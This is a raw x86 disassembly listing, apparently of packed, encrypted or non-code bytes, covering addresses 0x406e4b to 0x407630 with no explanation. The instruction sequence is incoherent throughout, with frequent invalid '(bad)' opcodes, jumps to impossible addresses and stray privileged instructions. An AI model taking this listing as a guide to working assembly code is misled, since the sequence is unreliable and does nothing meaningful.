  406e4b:	mov    esi,DWORD PTR [edi]
  406e4d:	std    
  406e4e:	mov    edx,0xd6e633af
  406e53:	add    al,0x0
  406e55:	(bad)  
  406e56:	retf   0xb632
  406e59:	mov    ah,0x5d
  406e5b:	call   0x72b41025
  406e60:	lsl    eax,WORD PTR [edx-0x7ffff162]
  406e67:	push   edi
  406e68:	imul   ebp,ecx,0x3eef65f0
  406e6e:	inc    ebx
  406e6f:	inc    edi
  406e70:	jp     0x406e26
  406e72:	lods   eax,DWORD PTR ds:[esi]
  406e73:	loop   0x406eaa
  406e75:	xchg   esp,eax
  406e76:	cld    
  406e77:	ja     0x406ec0
  406e79:	sbb    al,0xe8
  406e7b:	mov    bh,0xda
  406e7d:	outs   dx,BYTE PTR ds:[esi]
  406e7e:	dec    esp
  406e7f:	xchg   ebp,eax
  406e80:	jg     0x406e8a
  406e82:	inc    edx
  406e83:	dec    esi
  406e84:	(bad)  
  406e86:	add    bl,BYTE PTR [esi-0x2850d4e5]
  406e8c:	inc    ecx
  406e8d:	retf   0x27de
  406e90:	sub    eax,0xbf1c718e
  406e95:	enter  0x3af4,0xf8
  406e99:	or     bl,dh
  406e9b:	xchg   edx,eax
  406e9c:	loopne 0x406e93
  406e9e:	(bad)  
  406e9f:	mov    bl,0xa
  406ea1:	test   al,0xae
  406ea3:	popa   
  406ea4:	push   esi
  406ea5:	stos   BYTE PTR es:[edi],al
  406ea6:	cwde   
  406ea7:	mov    eax,0xeccb8653
  406eac:	inc    esi
  406ead:	push   cs
  406eae:	xchg   esi,eax
  406eaf:	mov    ah,BYTE PTR [esi]
  406eb1:	mov    WORD PTR [edi],cs
  406eb3:	jp     0x406e41
  406eb5:	adc    BYTE PTR [edi+0x3090dc1d],ch
  406ebb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ebc:	popa   
  406ebd:	sub    BYTE PTR [ebx+0x3b],al
  406ec0:	fstp   DWORD PTR [ebx+eax*2+0x1e30a623]
  406ec7:	retf   0xa5ea
  406eca:	sub    al,0x6b
  406ecc:	fcom   st(5)
  406ece:	fist   DWORD PTR [ebx-0x1d]
  406ed1:	ins    DWORD PTR es:[edi],dx
  406ed2:	repz sbb bl,BYTE PTR [ebx-0x2b]
  406ed6:	js     0x406f24
  406ed8:	adc    BYTE PTR [ebp+0x7ea49af4],dl
  406ede:	sub    ebx,DWORD PTR [ebx-0x597b6b63]
  406ee4:	fld    st(2)
  406ee6:	cld    
  406ee7:	loop   0x406ed7
  406ee9:	pop    esi
  406eea:	inc    eax
  406eeb:	add    eax,0x33122744
  406ef0:	sbb    BYTE PTR [ecx+eiz*4],bl
  406ef3:	mov    edi,gs
  406ef5:	add    ebx,DWORD PTR [edx]
  406ef7:	ins    DWORD PTR es:[edi],dx
  406ef8:	call   0x1cdaaa70
  406efd:	sar    DWORD PTR [esi],0x80
  406f00:	addr16 add dl,0xa
  406f04:	dec    ecx
  406f05:	(bad)  
  406f06:	hlt    
  406f07:	jecxz  0x406f30
  406f09:	shl    ch,0xc1
  406f0c:	sbb    DWORD PTR [eax-0x5d],ecx
  406f0f:	not    DWORD PTR [ecx-0x50]
  406f12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f13:	dec    esi
  406f14:	popf   
  406f15:	push   ds
  406f16:	ret    
  406f17:	mov    ds:0xf0bc1c7e,al
  406f1c:	pop    ss
  406f1d:	mov    ebp,edi
  406f1f:	lods   eax,DWORD PTR ds:[esi]
  406f20:	xchg   esp,eax
  406f21:	add    eax,DWORD PTR [ecx-0x3d12ea8e]
  406f27:	push   ss
  406f28:	fsubr  st(5),st
  406f2a:	in     eax,0xd8
  406f2c:	inc    esp
  406f2d:	jns    0x406f6a
  406f2f:	shr    BYTE PTR [edi],1
  406f31:	test   BYTE PTR [eax-0x34],ch
  406f34:	mov    esi,0x942fbe58
  406f39:	cmp    DWORD PTR [ecx],esi
  406f3b:	xchg   ebp,eax
  406f3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f3d:	cmp    al,0xfe
  406f3f:	xor    al,dl
  406f41:	push   ebx
  406f42:	push   0xd0a87dd0
  406f47:	pop    es
  406f48:	jmp    0xc715c2c0
  406f4d:	test   DWORD PTR [esi+edi*2-0x8],0xe1a4a57b
  406f55:	inc    edx
  406f56:	bound  ecx,QWORD PTR [eax+ebx*8+0x30873fa]
  406f5d:	retf   0x9abf
  406f60:	scas   eax,DWORD PTR es:[edi]
  406f61:	ror    dh,1
  406f63:	fist   WORD PTR [ebx+0x405bd072]
  406f69:	fdiv   DWORD PTR [ecx]
  406f6b:	dec    esp
  406f6c:	data16 jmp 0x406f26
  406f6f:	dec    ebp
  406f70:	adc    DWORD PTR [ebx+ebp*1-0x6c],edi
  406f74:	sbb    eax,DWORD PTR [ebp+0x6d8b38cc]
  406f7a:	xor    BYTE PTR [ebp-0x3dff590d],ch
  406f80:	adc    ch,0x96
  406f83:	mov    ss,WORD PTR [edi-0x402bd5d1]
  406f89:	mov    DWORD PTR [ebx-0x20b36e7e],edx
  406f8f:	dec    edx
  406f90:	adc    DWORD PTR [ebx],ebp
  406f92:	inc    ebp
  406f93:	fdivr  st,st(0)
  406f95:	repz test DWORD PTR ds:[edi+0x5cc31886],eax
  406f9d:	mov    ds:0x4633b3f5,al
  406fa2:	div    BYTE PTR [esi]
  406fa4:	mov    ebx,0x95f587b2
  406fa9:	dec    esp
  406faa:	and    bh,BYTE PTR ds:0x60018e6
  406fb0:	arpl   WORD PTR [esi],dx
  406fb2:	lds    ecx,FWORD PTR [edi-0x4b12cb3d]
  406fb8:	out    0x89,eax
  406fba:	xor    edi,edi
  406fbc:	les    esi,FWORD PTR [eax+esi*4-0x18027154]
  406fc3:	push   edx
  406fc4:	add    bh,cl
  406fc6:	jnp    0x1941b4c8
  406fcc:	stc    
  406fcd:	inc    eax
  406fce:	daa    
  406fcf:	sbb    al,0x5
  406fd1:	shl    ebp,0xe1
  406fd4:	mov    ecx,0x815f34ff
  406fd9:	repnz imul ebx,DWORD PTR [ebp-0x22],0x1cf03691
  406fe1:	push   es
  406fe2:	stc    
  406fe3:	mov    al,0x6c
  406fe5:	mov    al,ds:0x74c66e4f
  406fea:	sub    DWORD PTR [ebp+esi*1-0x66],edi
  406fee:	pusha  
  406fef:	jl     0x406fde
  406ff1:	sub    DWORD PTR [ebx+0x3e],0xd27fa21a
  406ff8:	jo     0x406f7f
  406ffa:	gs pusha 
  406ffc:	cdq    
  406ffd:	outs   dx,DWORD PTR ds:[esi]
  406ffe:	mov    dl,0xf4
  407000:	jo     0x407011
  407002:	mov    ch,cl
  407004:	int3   
  407005:	push   edx
  407006:	sbb    DWORD PTR [edi+0x5edf8eab],edi
  40700c:	ret    
  40700d:	icebp  
  40700e:	rcr    cl,0xbe
  407011:	or     bh,BYTE PTR [esi-0x6e093a1b]
  407017:	inc    esp
  407018:	and    ah,ch
  40701a:	jne    0x40705c
  40701c:	mov    bh,0x1b
  40701e:	inc    edi
  40701f:	mov    ebx,0xb07e7063
  407024:	(bad)  
  407025:	pop    edi
  407026:	scas   al,BYTE PTR es:[edi]
  407027:	xor    esi,edx
  407029:	mov    DWORD PTR [ebx+eax*1-0x41],esi
  40702d:	mov    fs,WORD PTR [edi]
  40702f:	dec    ecx
  407030:	mov    ds:0xee887df7,eax
  407035:	push   eax
  407036:	adc    al,BYTE PTR [eax+0x644eb8c3]
  40703c:	dec    ebx
  40703d:	inc    edx
  40703e:	in     al,dx
  40703f:	not    DWORD PTR [ecx+ebx*4]
  407042:	fwait
  407043:	sbb    dl,BYTE PTR [edx-0x30]
  407046:	push   edx
  407047:	into   
  407048:	fcmovne st,st(4)
  40704a:	test   ah,0xe6
  40704d:	or     al,0xff
  40704f:	mov    ebx,0x6c5a1b0d
  407054:	pop    es
  407055:	jno    0x406fe6
  407057:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407058:	int3   
  407059:	repnz cmp DWORD PTR ds:0x225eeb05,ecx
  407060:	int    0x9f
  407062:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  407064:	ror    DWORD PTR [ebp+0x558e1492],cl
  40706a:	adc    dl,al
  40706c:	mov    DWORD PTR [eax+esi*4+0x46],ebx
  407070:	mov    ah,0x40
  407072:	popf   
  407073:	mov    ch,0x72
  407075:	and    al,0x9
  407077:	pop    ecx
  407078:	sahf   
  407079:	icebp  
  40707a:	cmp    edx,DWORD PTR [eax-0x54]
  40707d:	jmp    0xc200663a
  407082:	jg     0x407035
  407084:	cs in  eax,0x34
  407087:	push   edi
  407088:	out    0xb4,eax
  40708a:	shl    bh,0x36
  40708d:	outs   dx,BYTE PTR ds:[esi]
  40708e:	pop    ss
  40708f:	add    eax,0xaec29805
  407094:	stos   DWORD PTR es:[edi],eax
  407095:	scas   al,BYTE PTR es:[edi]
  407096:	add    DWORD PTR [esi+0x56],esi
  407099:	jb     0xcbfda8f2
  40709f:	mov    ch,0x0
  4070a1:	retf   
  4070a2:	cld    
  4070a3:	pop    edx
  4070a4:	jecxz  0x407079
  4070a6:	dec    esp
  4070a7:	adc    esp,DWORD PTR [ecx+0x5655056f]
  4070ad:	sbb    DWORD PTR cs:[edx-0x7283f847],ecx
  4070b4:	mov    esi,0xf7ac7fb2
  4070b9:	les    ebx,FWORD PTR [edi+0x4a]
  4070bc:	or     dl,BYTE PTR [esi]
  4070be:	test   al,0x3a
  4070c0:	jno    0x407058
  4070c2:	cmp    al,0xe8
  4070c4:	mov    dl,0x2b
  4070c6:	pop    ebx
  4070c7:	mov    ebx,0x555b415c
  4070cc:	sahf   
  4070cd:	add    al,0x9a
  4070cf:	ret    
  4070d0:	push   esi
  4070d1:	loope  0x40712f
  4070d3:	inc    edi
  4070d4:	test   DWORD PTR [edi+ebp*1+0x21],0xa9e1db1e
  4070dc:	test   bh,ch
  4070de:	dec    ecx
  4070df:	mov    ds,WORD PTR [ebx-0xe1816d9]
  4070e5:	mov    DWORD PTR gs:[edx-0x4a931d7b],ebx
  4070ec:	cmp    ecx,DWORD PTR [edx]
  4070ee:	cmc    
  4070ef:	(bad)  
  4070f0:	das    
  4070f1:	retf   0x1b3
  4070f4:	pop    ecx
  4070f5:	ss adc eax,0x172b112a
  4070fb:	ins    BYTE PTR es:[edi],dx
  4070fc:	cmp    BYTE PTR [edi+0x38f0f60e],bl
  407102:	push   esi
  407103:	xchg   esp,eax
  407104:	retf   0x93be
  407107:	aaa    
  407108:	cld    
  407109:	push   ds
  40710a:	push   ecx
  40710b:	mov    ch,0xe0
  40710d:	in     eax,0xea
  40710f:	loop   0x407186
  407111:	sbb    DWORD PTR [eax],esp
  407113:	call   0x6d297473
  407118:	lea    esi,[esi+0x2ccd13c4]
  40711e:	outs   dx,DWORD PTR ds:[esi]
  40711f:	mov    ds:0xa9a3fd46,al
  407124:	mov    ebp,edi
  407126:	repz mov ebp,0xd79b5ebc
  40712c:	addr16 jmp 0xe5a87d2f
  407132:	inc    eax
  407133:	and    BYTE PTR [edx+0x7c],al
  407136:	dec    eax
  407137:	stc    
  407138:	xor    bl,BYTE PTR [edx]
  40713a:	cwde   
  40713b:	xchg   esi,eax
  40713c:	push   0x8aab2c3
  407141:	mov    al,ds:0x3ad81f42
  407146:	(bad)  
  407147:	test   eax,0xea55a4f7
  40714c:	sbb    ch,BYTE PTR [esi+0x3817f38b]
  407152:	mov    bl,0x67
  407154:	mov    ecx,edi
  407156:	sti    
  407157:	loopne 0x4071a8
  407159:	shl    BYTE PTR [ebx],0x6
  40715c:	int3   
  40715d:	sub    BYTE PTR [eax-0x55],dl
  407160:	dec    edx
  407161:	push   edi
  407162:	mov    dh,0x8f
  407164:	add    eax,0x64ffd174
  407169:	mov    es,WORD PTR [edx-0x29dfc98a]
  40716f:	push   cs
  407170:	push   es
  407171:	in     eax,0x48
  407173:	mov    BYTE PTR [eax],bh
  407175:	inc    eax
  407176:	stos   BYTE PTR es:[edi],al
  407177:	jle    0x407187
  407179:	into   
  40717a:	or     BYTE PTR [edi-0x7f1831e2],ch
  407180:	mov    al,dh
  407182:	sbb    esi,DWORD PTR es:[ecx]
  407185:	lea    esi,[ecx]
  407187:	xchg   esp,eax
  407188:	xor    ecx,DWORD PTR [eax]
  40718a:	sar    BYTE PTR [ebx],cl
  40718c:	mov    ah,0xf8
  40718e:	imul   eax,DWORD PTR [ebx],0x3
  407191:	or     bh,0xf3
  407194:	jae    0x407173
  407196:	cmp    eax,0xf49da1fc
  40719b:	or     DWORD PTR [ebx],ebx
  40719d:	mov    dh,0x73
  40719f:	xor    ebx,edx
  4071a1:	push   edx
  4071a2:	lahf   
  4071a3:	call   0xd7d6a665
  4071a8:	xchg   ebx,eax
  4071a9:	addr16 jp 0x4071ce
  4071ac:	ss popf 
  4071ae:	ins    DWORD PTR es:[edi],dx
  4071af:	sub    BYTE PTR [ecx+0x6630a947],bl
  4071b5:	mov    bh,0x88
  4071b7:	test   ecx,ebx
  4071b9:	inc    esi
  4071ba:	jo     0x40718a
  4071bc:	nop
  4071bd:	xor    eax,DWORD PTR [esi+eax*8+0x20]
  4071c1:	(bad)  
  4071c2:	aas    
  4071c3:	(bad)  [ecx-0x378af76a]
  4071c9:	dec    esi
  4071ca:	(bad)  {k4}{z}
  4071cf:	jl     0x40722f
  4071d1:	ins    DWORD PTR es:[edi],dx
  4071d2:	out    dx,al
  4071d3:	sub    DWORD PTR ss:[ebp+0x6c],edx
  4071d7:	aam    0xa8
  4071d9:	push   cs
  4071da:	icebp  
  4071db:	stos   BYTE PTR es:[edi],al
  4071dc:	xor    eax,0x290d48ea
  4071e1:	mov    ch,0x67
  4071e3:	icebp  
  4071e4:	mov    ds:0x1eedb4b5,eax
  4071e9:	sbb    ch,BYTE PTR [ebx-0x23587324]
  4071ef:	ds mov esi,0xd23029c4
  4071f5:	pop    es
  4071f6:	mov    cl,0xc7
  4071f8:	or     BYTE PTR [ebx+esi*2+0x20922d9e],0x20
  407200:	dec    ecx
  407201:	enter  0x33b8,0x48
  407205:	push   0xda91ed82
  40720a:	pop    ebp
  40720b:	adc    eax,0xede011a
  407211:	jge    0x40723a
  407213:	test   al,0x14
  407215:	nop
  407216:	loop   0x407200
  407218:	leave  
  407219:	push   esi
  40721a:	sub    esi,DWORD PTR [edx-0x752c6084]
  407220:	rcl    BYTE PTR [ebx],cl
  407222:	(bad)  
  407223:	in     eax,dx
  407224:	push   0x7e9c38c3
  407229:	ins    BYTE PTR es:[edi],dx
  40722a:	sbb    bh,ah
  40722c:	test   BYTE PTR [ecx-0x71],0x59
  407230:	dec    ebp
  407231:	inc    ecx
  407232:	inc    edi
  407233:	jecxz  0x40727f
  407235:	add    DWORD PTR [ecx-0x7d],edi
  407238:	push   esi
  407239:	stos   DWORD PTR es:[edi],eax
  40723a:	cs push ebx
  40723c:	push   ecx
  40723d:	mov    ecx,0xcce4243d
  407242:	(bad)  
  407243:	sub    BYTE PTR [ecx-0x2d526392],bh
  407249:	sti    
  40724a:	and    eax,DWORD PTR [ecx+0x42]
  40724d:	dec    esp
  40724e:	loope  0x4072c6
  407250:	js     0x407224
  407252:	and    al,0xbd
  407254:	call   0xc64a75b8
  407259:	outs   dx,DWORD PTR ds:[esi]
  40725a:	into   
  40725b:	arpl   WORD PTR [eax+0x7f8463ea],si
  407261:	mov    edx,0x657dc06b
  407266:	inc    ebx
  407267:	inc    eax
  407268:	sti    
  407269:	xchg   BYTE PTR [edx],bh
  40726b:	mov    ds:0xf294e7c8,eax
  407270:	scas   al,BYTE PTR es:[edi]
  407271:	jmp    0x40721f
  407273:	cld    
  407274:	adc    DWORD PTR [ebp-0x62a7e497],edi
  40727a:	mov    edx,0x4f5b97b1
  40727f:	push   cs
  407280:	out    0x94,eax
  407282:	mov    ah,0xab
  407284:	dec    ebx
  407285:	push   ebp
  407286:	xlat   BYTE PTR ds:[ebx]
  407287:	lods   eax,DWORD PTR ds:[esi]
  407288:	das    
  407289:	mov    eax,0xb74cd9ea
  40728e:	leave  
  40728f:	cmp    ecx,DWORD PTR [edx]
  407291:	sti    
  407292:	sub    BYTE PTR [ecx],0x54
  407295:	sub    al,0x4c
  407297:	or     eax,0xe56db966
  40729c:	cs xchg ecx,eax
  40729e:	stos   BYTE PTR es:[edi],al
  40729f:	adc    BYTE PTR [eax-0x2d],bh
  4072a2:	mov    bh,0x13
  4072a4:	add    ebx,DWORD PTR [edi-0x38]
  4072a7:	mov    eax,ds:0xce26fd05
  4072ac:	dec    edi
  4072ae:	inc    ebx
  4072af:	jae    0x40729e
  4072b1:	in     eax,dx
  4072b2:	stos   DWORD PTR es:[edi],eax
  4072b3:	dec    ecx
  4072b4:	fiadd  DWORD PTR [ecx-0x4ed7da91]
  4072ba:	inc    ebp
  4072bb:	sbb    al,0x88
  4072bd:	dec    esp
  4072be:	cwde   
  4072bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072c0:	xor    al,0xf8
  4072c2:	scas   eax,DWORD PTR es:[edi]
  4072c3:	(bad)  
  4072c5:	int3   
  4072c6:	loopne 0x4072d6
  4072c8:	sar    BYTE PTR [eax-0x48beb22f],cl
  4072ce:	add    dl,al
  4072d0:	adc    ebp,DWORD PTR [esi]
  4072d2:	(bad)  [ebx+0x540b7c1c]
  4072d8:	or     al,BYTE PTR [edx+0x4d09a6f3]
  4072de:	xchg   di,ax
  4072e0:	mov    bh,BYTE PTR [edx]
  4072e2:	pop    ecx
  4072e3:	ss repz or eax,0x6e6836c8
  4072ea:	(bad)  
  4072ec:	mov    gs,WORD PTR [esi-0x5bde9486]
  4072f2:	mov    al,ds:0xf81e603d
  4072f7:	cld    
  4072f8:	push   ebp
  4072f9:	std    
  4072fa:	ja     0x40732f
  4072fc:	loopne 0x407346
  4072fe:	mov    cl,BYTE PTR [ebx+0x2a]
  407301:	and    dh,BYTE PTR [edi+ebx*4-0x18593e94]
  407308:	mov    cl,0xe9
  40730a:	(bad)
  40730e:	add    eax,0x53d5fe9c
  407313:	repnz popa 
  407315:	adc    esp,eax
  407317:	inc    edi
  407318:	(bad)  
  407319:	rcl    BYTE PTR ss:[edi],cl
  40731c:	xchg   BYTE PTR [eax],ah
  40731e:	scas   al,BYTE PTR es:[edi]
  40731f:	jae    0x407375
  407321:	ins    BYTE PTR es:[edi],dx
  407322:	div    BYTE PTR [edx]
  407324:	xor    eax,0x672c8b3e
  407329:	jmp    0x4072be
  40732b:	and    edx,DWORD PTR [ecx]
  40732d:	mov    eax,ds:0x4a0a311d
  407332:	jno    0x40736d
  407334:	pushf  
  407335:	pop    DWORD PTR [ebp-0x65106a96]
  40733b:	fadd   st(6),st
  40733d:	and    ebx,DWORD PTR [edx]
  40733f:	add    edx,eax
  407341:	and    eax,0x89bc1faa
  407346:	sbb    eax,edx
  407348:	add    al,0xf4
  40734a:	loop   0x4073bf
  40734c:	mov    ch,0x5f
  40734e:	sub    eax,0x4ddec4fc
  407353:	test   eax,0xa08d2171
  407358:	jl     0x407328
  40735a:	outs   dx,DWORD PTR ds:[esi]
  40735b:	and    al,0xe0
  40735d:	sbb    al,BYTE PTR [edx-0x424c5eb1]
  407363:	xor    eax,0x921047bf
  407368:	push   0x9e33ba3
  40736d:	jns    0x4073a8
  40736f:	push   ds
  407370:	dec    eax
  407371:	clc    
  407372:	fld    QWORD PTR [edi+0x22]
  407375:	mov    esi,0x7d35eb2d
  40737a:	lea    edx,[ebp-0x4dc4f8c5]
  407380:	(bad)  
  407381:	loopne 0x4073d8
  407383:	sub    BYTE PTR [eax],bl
  407385:	mov    dh,0x1c
  407387:	jmp    0x1325:0x6fbce63d
  40738e:	mov    ch,0xb9
  407390:	lahf   
  407391:	lods   eax,DWORD PTR gs:[esi]
  407393:	mov    bl,0x66
  407395:	test   eax,0x62da6f
  40739a:	aas    
  40739b:	cmp    edi,DWORD PTR [edx+eiz*8+0x4b98c12b]
  4073a2:	cmp    bh,dh
  4073a4:	out    0x53,al
  4073a6:	loop   0x4073ee
  4073a8:	in     al,0x5d
  4073aa:	cwde   
  4073ab:	xor    DWORD PTR [edx],esi
  4073ad:	ror    BYTE PTR [esi],1
  4073af:	loop   0x4073c6
  4073b1:	cld    
  4073b2:	std    
  4073b3:	fsub   st,st(6)
  4073b5:	shr    ebp,0x9e
  4073b8:	or     cl,BYTE PTR [ebp-0x7477f333]
  4073be:	add    al,0x8c
  4073c0:	dec    esp
  4073c1:	mov    bh,0x91
  4073c3:	inc    ebx
  4073c4:	inc    esi
  4073c5:	mov    ds:0xe317522,al
  4073ca:	js     0x40742a
  4073cc:	jl     0x40738b
  4073ce:	pop    esi
  4073cf:	popf   
  4073d0:	xlat   BYTE PTR ds:[ebx]
  4073d1:	mov    ecx,0xb0fb9d62
  4073d6:	mov    BYTE PTR [ecx-0x769915e6],dh
  4073dc:	cli    
  4073dd:	(bad)  
  4073e0:	nop    DWORD PTR es:[ecx+0x69]
  4073e5:	test   DWORD PTR [edi],0x26ef283
  4073eb:	sub    edx,DWORD PTR [esi+0x61]
  4073ee:	or     edi,DWORD PTR [edi-0x39]
  4073f1:	pop    ecx
  4073f2:	xor    al,0x51
  4073f4:	lock mov esp,0x1bf6191e
  4073fa:	cmp    BYTE PTR [ecx-0x531353a4],bl
  407400:	jbe    0x4073b9
  407402:	ss out 0xc1,eax
  407405:	mov    ebp,0x2239afa0
  40740a:	push   esi
  40740b:	xchg   edx,eax
  40740c:	mov    al,ds:0xe23ab4a0
  407411:	sbb    BYTE PTR [edi+0x7116d6bc],ch
  407417:	cdq    
  407418:	pop    eax
  407419:	xchg   esp,eax
  40741a:	setle  BYTE PTR [ecx+0x2b]
  40741e:	shr    DWORD PTR [ebx+eax*8+0xd],1
  407422:	ja     0x4073df
  407424:	loop   0x4073d8
  407426:	sub    WORD PTR [edx],bp
  407429:	mov    al,ds:0x39cded48
  40742e:	mov    al,ds:0x25f90ce0
  407433:	xchg   DWORD PTR [esi-0x23fbab78],ebx
  407439:	loopne 0x4074ac
  40743b:	rcl    BYTE PTR [eax+0x3e],0x46
  40743f:	inc    ecx
  407440:	sub    cl,BYTE PTR [ecx-0x150a3de4]
  407446:	pop    ebx
  407447:	add    BYTE PTR [ebp-0x4a],0x50
  40744b:	jl     0x40742c
  40744d:	xchg   ebp,eax
  40744e:	hlt    
  40744f:	shl    esp,0x71
  407452:	pusha  
  407453:	jp     0x407449
  407455:	mov    ah,0xe
  407457:	xor    DWORD PTR es:[eax+0x9229680],edi
  40745e:	mov    al,ds:0xd5ae7d43
  407463:	add    DWORD PTR [esi+0x3613774c],edi
  407469:	ret    
  40746a:	push   cs
  40746b:	les    ebx,FWORD PTR [eax+ebx*4]
  40746e:	ret    0x4c06
  407471:	enter  0xac8,0xb9
  407475:	gs mov ah,0xb9
  407478:	pop    ds
  407479:	sahf   
  40747a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40747b:	leave  
  40747c:	imul   edi,DWORD PTR [edx+edx*8+0x4fc48e0d],0x5da8c6b3
  407487:	scas   al,BYTE PTR es:[edi]
  407488:	retf   0x5104
  40748b:	out    dx,eax
  40748c:	xchg   ecx,eax
  40748d:	xchg   edi,eax
  40748e:	aam    0x9e
  407490:	pop    ds
  407491:	cld    
  407492:	clc    
  407493:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407494:	cmc    
  407495:	or     DWORD PTR [ecx+0x67b577d],0xffffff9d
  40749c:	div    BYTE PTR [ebx+0x47771529]
  4074a2:	out    dx,eax
  4074a3:	test   al,0x28
  4074a5:	ja     0x4074f0
  4074a7:	mov    ds:0x131bf020,eax
  4074ac:	cwde   
  4074ad:	cmp    eax,0xd681ee4a
  4074b2:	adc    dh,cl
  4074b4:	xrelease xchg DWORD PTR [ecx-0x5e2ddfb4],eax
  4074bb:	arpl   WORD PTR [edx-0x18],dx
  4074be:	je     0x407503
  4074c0:	jbe    0x4074d5
  4074c2:	jecxz  0x40747b
  4074c4:	mov    ch,0xf2
  4074c6:	or     DWORD PTR [ebx-0x38f585e8],esp
  4074cc:	lahf   
  4074cd:	adc    eax,0x43faf746
  4074d2:	xchg   DWORD PTR [ebp+0x2d],ebx
  4074d5:	cmp    DWORD PTR [ebp-0x4],0x612ac0ee
  4074dc:	popa   
  4074dd:	fldenv [ebx]
  4074df:	enter  0xbca2,0x9b
  4074e3:	jns    0x407558
  4074e5:	xor    al,0xda
  4074e7:	das    
  4074e8:	scas   eax,DWORD PTR es:[edi]
  4074e9:	push   0xd8a75ebc
  4074ee:	test   eax,0x2d8b1464
  4074f3:	jno    0x407547
  4074f5:	nop
  4074f6:	das    
  4074f7:	arpl   WORD PTR [eax],bx
  4074f9:	sub    eax,0x3c49fc46
  4074fe:	stos   DWORD PTR es:[edi],eax
  4074ff:	cmp    BYTE PTR [esi+0xf026b6f],bh
  407505:	xchg   ebp,eax
  407506:	test   BYTE PTR [ebx-0x5a1dcf55],cl
  40750c:	xchg   esi,eax
  40750d:	je     0x4074ee
  40750f:	add    BYTE PTR [edx],dl
  407511:	push   es
  407512:	or     DWORD PTR [ecx-0x4c],eax
  407515:	push   0x48be2049
  40751a:	lds    edx,FWORD PTR [esp+edx*8+0x5d]
  40751e:	popa   
  40751f:	outs   dx,BYTE PTR gs:[esi]
  407521:	das    
  407522:	jb     0x40759c
  407524:	pop    ebx
  407525:	adc    al,0x18
  407527:	jne    0x407585
  407529:	inc    edx
  40752a:	jno    0x407578
  40752c:	enter  0x6aac,0xe4
  407530:	xor    BYTE PTR [ebp+0x70d25112],ah
  407536:	jnp    0x4074cd
  407538:	ss pop ds
  40753a:	jb     0x407569
  40753c:	retf   
  40753d:	mov    dl,0x98
  40753f:	iret   
  407540:	xlat   BYTE PTR ds:[ebx]
  407541:	loope  0x40755c
  407543:	jnp    0x40752b
  407545:	test   al,0x22
  407547:	daa    
  407548:	retf   0x83d5
  40754b:	fidivr DWORD PTR [esp+edi*1+0x44]
  40754f:	or     eax,0xbbe58d70
  407554:	scas   al,BYTE PTR es:[edi]
  407555:	dec    ebx
  407556:	imul   esp,DWORD PTR [ebp-0x4c],0x3a1d9185
  40755d:	les    eax,FWORD PTR [eax+0x6a1cc1b]
  407563:	js     0x40750f
  407565:	or     al,0xa2
  407567:	outs   dx,BYTE PTR ds:[esi]
  407568:	ins    DWORD PTR es:[edi],dx
  407569:	dec    esp
  40756a:	mov    ebx,DWORD PTR [ebp-0x63]
  40756d:	(bad)  
  40756f:	mov    ebx,es
  407571:	sub    al,0x9d
  407573:	dec    ebp
  407574:	in     eax,dx
  407575:	pop    es
  407576:	cmp    al,0xc
  407578:	push   es
  407579:	jge    0x4075d3
  40757b:	out    dx,al
  40757c:	push   ebx
  40757d:	xchg   ebp,eax
  40757e:	icebp  
  40757f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407580:	and    BYTE PTR [ecx],bh
  407582:	pop    edx
  407583:	mov    bl,0x22
  407585:	outs   dx,BYTE PTR ds:[esi]
  407586:	repnz xlat BYTE PTR ds:[ebx]
  407588:	mov    ecx,0xfd443d03
  40758d:	adc    DWORD PTR [edx+0x5],esi
  407590:	scas   eax,DWORD PTR es:[edi]
  407591:	xchg   esp,eax
  407592:	push   ds
  407593:	add    al,0x69
  407595:	xchg   ebx,eax
  407596:	(bad)  
  407597:	mov    eax,0x7f467454
  40759c:	icebp  
  40759d:	in     eax,dx
  40759e:	les    edi,FWORD PTR [edi+0x9c7b1e8]
  4075a4:	pop    edi
  4075a5:	cld    
  4075a6:	in     eax,0x8e
  4075a8:	pop    es
  4075a9:	push   ebp
  4075aa:	sbb    al,0x86
  4075ac:	aad    0x29
  4075ae:	jbe    0x407560
  4075b0:	sbb    edi,DWORD PTR [ecx+0x33ede3d7]
  4075b6:	stos   BYTE PTR es:[edi],al
  4075b7:	inc    edi
  4075b8:	mov    ch,0x14
  4075ba:	push   edx
  4075bb:	aaa    
  4075bc:	out    0xce,eax
  4075be:	fiadd  WORD PTR [ebp-0x53fa8dab]
  4075c4:	popf   
  4075c5:	add    esi,DWORD PTR [esi+0x6c]
  4075c8:	and    al,0xf8
  4075ca:	fstp   QWORD PTR [ecx]
  4075cc:	outs   dx,DWORD PTR ds:[esi]
  4075cd:	mov    dl,0x6
  4075cf:	test   eax,0x40c2e45c
  4075d4:	retf   0xdfd1
  4075d7:	ficom  WORD PTR [esp+eiz*2-0x49]
  4075db:	call   FWORD PTR [eax]
  4075dd:	inc    esi
  4075de:	popf   
  4075df:	jne    0x4075b4
  4075e1:	out    0xc6,al
  4075e3:	xor    bl,BYTE PTR [esi]
  4075e5:	sti    
  4075e6:	(bad)  
  4075e7:	stos   BYTE PTR es:[edi],al
  4075e8:	int3   
  4075e9:	mov    BYTE PTR [edi+ecx*2-0x4],dh
  4075ed:	jp     0x40758d
  4075ef:	mov    al,0x5
  4075f1:	sti    
  4075f2:	dec    edi
  4075f3:	pop    ebx
  4075f4:	(bad)  [edi]
  4075f6:	sbb    BYTE PTR ds:0xc04e0127,ah
  4075fc:	stc    
  4075fd:	jmp    0x4075da
  4075ff:	loop   0x407647
  407601:	inc    edx
  407602:	adc    ch,bl
  407604:	loopne 0x40764c
  407606:	aaa    
  407607:	cmp    edi,DWORD PTR [ebp-0x8b2e17b]
  40760d:	fwait
  40760e:	rol    BYTE PTR [ebx],cl
  407610:	loop   0x407670
  407612:	inc    edx
  407613:	jmp    0x5f71:0x78a9ac96
  40761a:	push   ebp
  40761b:	inc    edi
  40761c:	and    eax,0xf58b3de6
  407621:	call   0xc88b:0x129d0091
  407628:	aam    0x1b
  40762a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40762b:	sar    bl,1
  40762d:	push   es
  40762e:	and    edi,edx
  407630:	mov    ds:0xcb604658,eax
